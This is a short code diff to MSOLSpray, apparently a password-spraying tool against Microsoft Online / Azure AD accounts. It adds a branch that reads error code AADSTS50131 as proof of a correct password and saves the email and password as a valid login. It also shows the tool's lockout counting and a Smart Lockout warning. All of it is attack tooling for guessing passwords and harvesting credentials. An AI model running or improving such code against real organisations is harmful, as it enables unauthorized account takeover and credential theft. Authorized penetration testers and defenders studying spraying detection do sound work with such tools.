@@ -137,11 +137,17 @@ class MSOLSpray:
                     self.valid_logins.append(f'{email} : {self.password}')
                     self.valid_emails.append(email)
 
+                elif 'AADSTS50131' in error:
+                    # Password is correct but login was blocked
+                    log.critical(f'{email} : {self.password} - Correct password but login was blocked.')
+                    log.error(error)
+                    self.valid_logins.append(f'{email} : {self.password}')
+                    self.valid_emails.append(email)
+
                 else:
                     # Unknown errors
                     log.error(f'Got an error we haven\'t seen yet for user {email}')
                     log.error(error)
-
 
             # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
             if not self.force and self.lockout_counter == 10 and self.lockout_question == False:
@@ -158,7 +164,6 @@ class MSOLSpray:
                     log.info('Cancelling the password spray.')
                     log.info('NOTE: If you are seeing multiple "account is locked" messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.')
                     break
-
 
             self.tried_logins.append(login_combo)
             yield None
